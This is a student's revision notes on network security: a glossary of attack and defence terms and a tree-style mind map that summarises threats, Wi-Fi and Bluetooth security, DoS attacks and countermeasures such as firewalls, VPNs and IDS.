*   **Cross-Site Scripting (XSS):** Injecting malicious scripts into a website, executed by other users' browsers.
*   **Directory Traversal:** Attack technique using `../` to access files outside the intended web root directory.
*   **DMZ (Demilitarized Zone):** Isolated network segment hosting public servers.
*   **DNS (Domain Name System):** System mapping hostnames to IP addresses.
*   **DNS Cache Poisoning:** Corrupting DNS cache entries to redirect traffic.
*   **DoS (Denial of Service):** Attack making a service unavailable.
*   **DDoS (Distributed Denial of Service):** DoS attack launched from many compromised machines.
*   **Eavesdropping:** Passively listening to communications.
*   **Evil Twin:** Rogue Wi-Fi AP masquerading as a legitimate one.
*   **Extranet:** Controlled extension of an intranet to external partners/users.
*   **Firewall:** Network security device controlling traffic flow based on rules.
*   **Google Hacking / Dorking:** Using search engines for reconnaissance.
*   **Impersonation:** Pretending to be a legitimate user or entity.
*   **Integrity Attack:** Unauthorized modification of data.
*   **Intranet:** Private network within an organization using internet technologies.
*   **IPsec (Internet Protocol Security):** Protocol suite for secure IP communications (VPNs).
*   **L2TP (Layer 2 Tunneling Protocol):** VPN tunneling protocol.
*   **Man-in-the-Middle (MitM):** Attacker secretly relays/modifies communication between two parties.
*   **NGFW (Next-Generation Firewall):** Modern firewall with advanced features (IPS, app control, etc.).
*   **OSINT (Open Source Intelligence):** Gathering information from publicly available sources.
*   **Packet Filter:** Firewall operating at Layer 3, examining packet headers statelessly.
*   **Packet Sniffer:** Tool/software used to capture network traffic.
*   **Phishing:** Social engineering attack using deceptive emails/websites to steal credentials.
*   **PPTP (Point-to-Point Tunneling Protocol):** VPN tunneling protocol.
*   **Promiscuous Mode:** NIC mode capturing all packets on the network segment, not just those addressed to it.
*   **Proxy:** See Application-Level Gateway.
*   **Sandbox:** Restricted execution environment limiting code capabilities (used by Java, JS).
*   **Session Hijacking:** Taking over an established communication session.
*   **Smurf Attack:** DDoS amplification attack using ICMP echo requests to broadcast addresses.
*   **Social Engineering:** Manipulating people to divulge information or perform actions.
*   **Spoofing:** Masquerading as another entity (IP, MAC, URL, Email, etc.).
*   **SQL Injection:** Injecting malicious SQL code via web input to manipulate backend databases.
*   **Stateful Inspection Firewall:** Firewall tracking the state of network connections.
*   **SYN Flood:** DoS attack exploiting the TCP handshake by sending SYN packets without ACKs.
*   **Traffic Flow Analysis:** Gleaning information by analyzing communication patterns (who talks to whom).
*   **Typosquatting:** Registering domain names similar to popular sites with typos.
*   **VPN (Virtual Private Network):** Secure, encrypted connection over an untrusted network.
*   **Wiretapping:** Intercepting communications by physically accessing the medium.

# Mind Map/Concept Diagram

```
Network Security (Chapter 6)
│
├── I. Fundamental Concepts
│   ├── A. Core Goal: Protect data/resources in transit & access
│   ├── B. Transmission Media & Vulnerabilities
│   │   ├── Cable (Wire): Emanation, Tapping (Physical Access)
│   │   ├── Optical Fiber: Harder to tap (detectable loss), vulnerable at connections/bends
│   │   ├── Microwave: Exposed path, interception near receiver
│   │   ├── WiFi (Wireless): Interception (broadcast), Jamming, Interference
│   │   └── Satellite: Delay, interception near receiver (wide spread)
│   ├── C. OSI Model: Framework for understanding network functions & attack layers
│   ├── D. Fundamental Threats (I-M-F-I)
│   │   ├── Interception (Confidentiality) - Eavesdropping, Sniffing
│   │   ├── Modification (Integrity) - Tampering
│   │   ├── Fabrication (Integrity/Authenticity) - Spoofing, Insertion
│   │   └── Interruption (Availability) - DoS, Cutting cables
│   └── E. Security Perimeters
│       ├── Definition: Boundary around controlled area
│       ├── Inside vs. Between: Trust levels, need for encryption between perimeters
│
├── II. Network Vulnerabilities & Attack Surfaces
│   ├── A. Why Networks are Vulnerable
│   │   ├── Anonymity
│   │   ├── Many Points of Attack
│   │   ├── Sharing Nature
│   │   ├── System Complexity
│   │   ├── Unknown Perimeter / Path
│   ├── B. Defining the Perimeter Components
│   │   ├── Border Routers
│   │   ├── Firewalls (Filter)
│   │   ├── IDS (Detect) / IPS (Prevent)
│   │   └── DMZ (Buffer Zone)
│   ├── C. Data Corruption Sources & Attacks
│   │   ├── Sources: Errors (Human, HW, SW), Malice, Network Issues
│   │   └── Attack Types: Sequencing, Substitution, Insertion, Replay
│   ├── D. Reconnaissance: Port Scanning (`nmap`) - Identify open ports/services
│
├── III. Common Network Threats (Expanded from Firewall/Threats Slides)
│   ├── A. Reconnaissance
│   │   ├── Social Engineering (Manipulation)
│   │   ├── Dumpster Diving
│   │   ├── Eavesdropping (Oral)
│   │   ├── Google Hacking (OSINT)
│   ├── B. Eavesdropping / Wiretapping
│   │   ├── Passive vs. Active
│   │   ├── Link Tapping (Vulnerabilities by media - see I.B)
│   │   ├── Wireless Interception (Easy, long range possible)
│   │   ├── Network Sniffing (Promiscuous Mode)
│   │   └── Misdelivered Info (LAN broadcasts, email errors)
│   ├── C. Impersonation / Masquerading
│   │   ├── User Impersonation (Password Theft)
│   │   └── Exploiting Trust Relationships (rhosts, Machine Trust)
│   ├── D. Spoofing
│   │   ├── URL Spoofing (Typosquatting, Homographs) -> Phishing
│   │   ├── Web Page Spoofing -> Phishing
│   │   ├── "Evil Twin" Attack (Rogue AP)
│   │   └── Other: IP, MAC, Email Spoofing
│   ├── E. Session Hijacking & Man-in-the-Middle (MitM)
│   │   ├── Session Hijacking (TCP Sequence Prediction, Cookie Theft)
│   │   └── MitM Attack (Attacker relays/modifies traffic between parties)
│   ├── F. Traffic Flow Analysis (Metadata risks)
│   ├── G. Integrity Attacks
│   │   ├── Packet Modification (Payload, Headers)
│   │   └── DNS Cache Poisoning
│   ├── H. Protocol Failures
│   │   ├── Ignoring Rules (e.g., TCP congestion control)
│   │   ├── Poor Implementation / Malformed Packets (Buffer Overflows)
│   │   ├── Complexity Exploits
│   │   └── Broken Security Mechanisms (e.g., WEP)
│   ├── I. Web Site Vulnerabilities
│   │   ├── Code Examination
│   │   ├── Defacement
│   │   ├── Malicious Input (Buffer Overflow, Shell, SQL Injection, Directory Traversal)
│   │   ├── State Modification (Cookies, URL Params)
│   │   └── Cross-Site Scripting (XSS) (Injecting client-side script)
│   └── J. Active / Mobile Code Risks
│       ├── Dangers (DoS, Exploits, File Access)
│       ├── Security Mechanisms & Flaws (Sandbox (Java/JS), Signatures (ActiveX), Plugins)
│
├── IV. Wireless Security (WLANs)
│   ├── A. IEEE 802.11 (Wi-Fi) Specifics
│   │   ├── Architecture: BSS (IBSS/Ad Hoc vs Infrastructure), AP, DS, ESS
│   │   ├── MAC Sublayer: DCF (CSMA/CA - IFS, Backoff, RTS/CTS, NAV), PCF (Polling), Frame Format, Addressing (To/From DS), Hidden/Exposed Station Problem
│   │   ├── Physical Layer: FHSS, DSSS, OFDM; Bands (2.4GHz / 5GHz); Standards (Legacy, a, b, g, n, ac, ax...)
│   │   └── Vulnerabilities: Confidentiality (Broadcast), Integrity (Signal Strength Hijack), Availability (Jamming, Deauth), Unauthorized Access, SSID discovery, Evil Twin
│   ├── B. WEP (Wired Equivalent Privacy) - OBSOLETE & INSECURE
│   │   └── Flaws: Weak RC4 Impl., Short Static Key, Small/Predictable IV (Birthday Attack), Weak Key Scheduling, No Auth/Integrity (CRC32)
│   ├── C. WPA / WPA2 / WPA3 (Wi-Fi Protected Access) - STANDARD
│   │   ├── Improvements: Dynamic Keys (TKIP/RC4 -> AES), Stronger Auth (PSK vs Enterprise/802.1X/RADIUS), Message Integrity Check (MIC/CCMP), 4-Way Handshake
│   │   └── Recommendation: Use WPA2/WPA3 with AES
│   └── D. Bluetooth
│       ├── Purpose: Short-range PAN, Ad hoc
│       ├── Architecture: Piconet (Primary/Secondary), Scatternet
│       └── Layers: Radio (GFSK), Baseband (FHSS/TDD, Framing), L2CAP (Mux, SAR, QoS), Profiles
│
├── V. Denial of Service (DoS / DDoS) Attacks
│   ├── A. Definitions: DoS (Unavailable Service), DDoS (Distributed DoS)
│   ├── B. DDoS Mechanism: Botnets -> Compromise -> C&C -> Flood Target (e.g., Mirai)
│   ├── C. Attack Categories/Types
│   │   ├── Volumetric (Network Pipe Clogging): UDP Flood, ICMP Flood, Amplification/Reflection (DNS, NTP, SNMP)
│   │   ├── Protocol / State-Exhaustion: SYN Flood (TCP Handshake Abuse), Ping of Death, Teardrop (Fragmentation)
│   │   └── Application Layer (Resource Exhaustion): HTTP Flood, Slowloris/Slow Read
│   ├── D. Specific Attack Examples
│   │   ├── Ping Flood / Ping of Death
│   │   ├── Smurf Attack (Broadcast Amplification - Mostly Mitigated)
│   │   ├── SYN Flood
│   │   ├── Teardrop Attack (Fragmentation)
│   │   ├── DNS Spoofing / Cache Poisoning (Used for DoS/Redirection)
│   │   ├── Rerouting / Route Poisoning / Black Hole Attack
│   │   └── Session Hijacking (Can lead to service disruption)
│   └── E. DoS/DDoS Countermeasures
│       ├── Network Firewalls (Filtering)
│       ├── IDS / IPS (Detection / Blocking)
│       ├── Traffic Filtering / Rate Limiting
│       ├── Load Balancers
│       ├── Content Delivery Networks (CDNs)
│       ├── DDoS Mitigation Services (Scrubbing Centers)
│       ├── Scalable Architecture
│       ├── OS-Level Protections (SYN Cookies, Reverse Path Filtering)
│       └── Incident Response Planning
│
├── VI. Core Security Controls & Essentials
│   ├── A. Encryption
│   │   ├── Link-to-Link (Layer 1/2): Hop-by-hop, plaintext at nodes, protects the medium
│   │   ├── End-to-End (Layer 4-7): Source-to-destination, protects content across network
│   │   └── Comparison: Focus, implementation, visibility, granularity
│   ├── B. Cryptographic Protocols
│   │   ├── SSL/TLS (Layer 4): HTTPS, SMTPS, etc.; Auth (Certs), Confidentiality, Integrity; Cipher Suite Negotiation (Downgrade Risk)
│   │   ├── IPSec (Layer 3): VPNs; AH/ESP (Auth/Encryption)
│   │   └── SSH (Application Layer): Secure Remote Login, Tunneling
│   ├── C. Secure Routing / Traffic Protection
│   │   ├── Onion Routing (Tor): Anonymity via layered encryption & relays, Traffic Analysis defense
│   │   └── Traffic Padding: Obscures traffic volume/timing
│   ├── D. Virtual Private Networks (VPN)
│   │   ├── Concept: Secure encrypted tunnel over public network
│   │   ├── Uses: Remote Access, Privacy, Geo-Bypass, Public Wi-Fi Security
│   │   └── Technology: IPSec, TLS (OpenVPN)
│   ├── E. Firewalls
│   │   ├── Definition: Filter traffic based on policy (rules)
│   │   ├── Reference Monitor Properties: Always invoked, Tamperproof, Verifiable
│   │   ├── Types & Layers:
│   │   │   ├── Packet Filter (Stateless, L3): IP/Port/Protocol based, Fast, Basic
│   │   │   ├── Stateful Inspection (L4+): Tracks connections (state table), Balanced
│   │   │   ├── Application Gateway / Proxy (L7): Content inspection, Slow, Secure, Protocol-specific
│   │   │   ├── Circuit-Level Gateway (L5/TCP): Validates TCP handshake, Hides topology
│   │   │   ├── Stateful Multilayer / NGFW: Combines features
│   │   │   └── Personal / Host-Based: Protects individual machine
│   │   ├── Firewall Environments: Simple, Complex, DMZ, VPN Gateway, Intranet/Extranet
│   │   ├── Network Address Translation (NAT): Address hiding, often firewall feature
│   │   └── Limitations: Can't stop internal threats, needs correct config, visible target
│   └── F. De-Militarized Zone (DMZ)
│       ├── Concept: Buffer network between internal/external
│       ├── Purpose: Host public services securely
│       └── Architecture: Typically uses two firewalls for isolation
│
└── VII. Monitoring, Detection & Supporting Technologies
    ├── A. Intrusion Detection/Prevention Systems (IDS/IPS)
    │   ├── Concept: IDS (Alarm System), IPS (Active Blocking)
    │   ├── Detection Methods: Signature-Based (Known Threats) vs. Anomaly/Heuristic-Based (Novel Threats, False Positives)
    │   └── Location: Network-Based (NIDS/NIPS) vs. Host-Based (HIDS/HIPS)
    ├── B. Honeypots
    │   ├── Concept: Decoy system
    │   └── Purpose: Distraction, Intel Gathering, Early Warning
    ├── C. Security Information and Event Management (SIEM)
    │   ├── Concept: Aggregate & Correlate Logs
    │   └── Purpose: Unified view, Threat detection, Incident Response, Compliance
    └── D. Data Loss Prevention (DLP)
        ├── Concept: Detect/Prevent sensitive data exfiltration
        └── Mechanism: Keyword/Pattern matching, Traffic analysis (Network/Host based)

```

# Made by Yashank